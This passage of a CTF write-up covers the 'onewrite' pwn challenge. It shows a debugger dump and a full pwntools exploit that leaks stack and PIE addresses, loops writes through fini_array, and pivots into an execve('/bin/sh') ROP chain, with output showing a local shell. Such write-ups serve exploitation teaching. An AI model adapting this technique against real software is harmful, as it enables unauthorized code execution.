$r11   : 0x0000000000000246
$r12   : 0x00007f3bdb61e140  →  0x00007f3bdb6208c0  →  0x0000000000000000
$r13   : 0x1               
$r14   : 0x00007f3bdb6208c0  →  0x0000000000000000
$r15   : 0x1               
$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000
───────────────────────────────────────────────────────────────────── stack ────
0x00007ffd5f926040│+0x0000: 0x00007f3bdb3754fa  →   pop rdi  ← $rsp
0x00007ffd5f926048│+0x0008: 0x00007f3bdb6203b0  →  0x0068732f6e69622f ("/bin/sh"?)
0x00007ffd5f926050│+0x0010: 0x00007f3bdb37a9f2  →   pop rsi
0x00007ffd5f926058│+0x0018: 0x0000000000000000
0x00007ffd5f926060│+0x0020: 0x00007f3bdb3b54c5  →   pop rdx
0x00007ffd5f926068│+0x0028: 0x0000000000000000
0x00007ffd5f926070│+0x0030: 0x00007f3bdb3b30ac  →   pop rax
0x00007ffd5f926078│+0x0038: 0x000000000000003b (";"?)
─────────────────────────────────────────────────────────────── code:x86:64 ────
   0x7f3bdb37d6ee                  add    BYTE PTR [rcx+0x480975d0], cl
   0x7f3bdb37d6f4                  add    esp, 0xd0
   0x7f3bdb37d6fa                  pop    rbx
 → 0x7f3bdb37d6fb                  ret    
   ↳  0x7f3bdb3754fa                  pop    rdi
      0x7f3bdb3754fb                  ret    
      0x7f3bdb3754fc                  mov    rax, QWORD PTR [rip+0x2ab915]        # 0x7f3bdb620e18
      0x7f3bdb375503                  xor    esi, esi
      0x7f3bdb375505                  test   rax, rax
      0x7f3bdb375508                  jne    0x7f3bdb37547b
─────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "onewrite", stopped, reason: BREAKPOINT
───────────────────────────────────────────────────────────────────── trace ────
[#0] 0x7f3bdb37d6fb → ret
[#1] 0x7f3bdb3754fa → pop rdi
[#2] 0x7f3bdb6203b0 → (bad)
[#3] 0x7f3bdb37a9f2 → pop rsi
────────────────────────────────────────────────────────────────────────────────
gef➤  x/4g $rsp
0x7ffd5f926040: 0x7f3bdb3754fa  0x7f3bdb6203b0
0x7ffd5f926050: 0x7f3bdb37a9f2  0x0
gef➤  x/2i 0x7f3bdb3754fa
   0x7f3bdb3754fa:  pop    rdi
   0x7f3bdb3754fb:  ret    
```

With that, we can see that `rsp` points to `0x7ffd5f926040` on the stack. For this iteration the stack leak was `0x7ffd5f925f70`. So the offset from the stack leak to where we store the start of our ROP Chain is `0x7ffd5f926040 - 0x7ffd5f925f70 = 0xd0`.

## Exploit

Putting it all together, we have the following exploit:

```
# This exploit is based off of: https://github.com/EmpireCTF/empirectf/blob/master/writeups/2019-01-19-Insomni-Hack-Teaser/README.md#onewrite

from pwn import *


target = process('./onewrite')
elf = ELF('onewrite')
#gdb.attach(target, gdbscript='pie b *0x106f3')

# Establish helper functions
def leak(opt):
    target.recvuntil('>')
    target.sendline(str(opt))
    leak = target.recvline()
    leak = int(leak, 16)
    return leak

def write(adr, val, other = 0):
    target.recvuntil('address :')
    target.send(str(adr))
    target.recvuntil('data :')
    if other == 0:
        target.send(p64(val))
    else:
        target.send(val)

    

# First leak the Stack address, and calculate where the return address will be in do_overwrite
stackLeak = leak(1)
ripAdr = stackLeak + 0x18

# Calculate where the return address for __libc_csu_fini
csiRipAdr = stackLeak - 72

# Write over the return address in do_overwrite with do_leak
write(ripAdr, p8(0x04), 1)


# Leak the PIE address of do leak
doLeakAdr = leak(2)

# Calculate the base of PIE  
pieBase = doLeakAdr - elf.symbols['do_leak']

# Calculate the address of the _fini_arr table, and the __libc_csu_fini function using the PIE base
finiArrAdr = pieBase + elf.symbols['__do_global_dtors_aux_fini_array_entry']
csuFini = pieBase + elf.symbols["__libc_csu_fini"]

# Calculate the position of do_overwrite
doOverwrite = pieBase + elf.symbols['do_overwrite']

# Write over return address in do_overwrite with do_overwrite
write(ripAdr, p8(0x04), 1)
leak(1)

# Write over the two entries in _fini_arr table with do_overwrite, and restart the loop
write(finiArrAdr + 8, doOverwrite)
write(finiArrAdr, doOverwrite)
write(csiRipAdr, csuFini)

# Increment stack address of saved rip for __libc_csu_fini due to new iteration of loop
csiRipAdr += 8

# Establish rop gagdets, and "/bin/sh" address
popRdi = pieBase + 0x84fa
popRsi = pieBase + 0xd9f2
popRdx = pieBase + 0x484c5
popRax = pieBase + 0x460ac
syscall = pieBase + 0x917c
binshAdr = doLeakAdr + 0x2aa99b

# 0x00000000000106f3 : add rsp, 0xd0 ; pop rbx ; ret
pivotGadget = pieBase + 0x106f3

# Function which we will use to write Qwords using loop
def writeQword(adr, val):
    global csiRipAdr
    write(adr, val)
    write(csiRipAdr, csuFini)
    csiRipAdr += 8

# first wite "/bin/sh" to the designated place in memory
writeQword(binshAdr, u64("/bin/sh\x00"))

'''
Our ROP Chain will do this:
pop rdi ptr to "/bin/sh";   ret
pop rsi 0 ; ret
pop rdx 0 ; ret
pop rax 0x59 ; ret
syscall
'''

# write the ROP chain
writeQword(stackLeak + 0xd0, popRdi)
writeQword(stackLeak + 0xd8, binshAdr)
writeQword(stackLeak + 0xe0, popRsi)
writeQword(stackLeak + 0xe8, 0)
writeQword(stackLeak + 0xf0, popRdx)
writeQword(stackLeak + 0xf8, 0)
writeQword(stackLeak + 0x100, popRax)
writeQword(stackLeak + 0x108, 59)
writeQword(stackLeak + 0x110, syscall)


# write the ROP pivot gadget to the return address of do_overwrite, which will trigger the rop chain
write(stackLeak - 0x10, pivotGadget)

# drop to an interactive shell
target.interactive()
```

When we run it:

```
$ python exploit.py
[+] Starting local process './onewrite': pid 14815
[!] Did not find any GOT entries
[*] '/Hackery/pod/modules/stack_pivot/insomnihack18_onewrite/onewrite'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] Switching to interactive mode
 $ w
 22:42:39 up  8:27,  1 user,  load average: 1.46, 1.54, 1.63
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
guyinatu :0       :0               14:15   ?xdm?  39:17   0.01s /usr/lib/gdm3/gdm-x-session --run-script env GNOME_SHELL_SESSION_MODE=ubuntu /usr/bin/gnome-session --session=ubuntu
$ ls
core  exploit.py  onewrite  readme.md
```

Just like that, we popped a shell!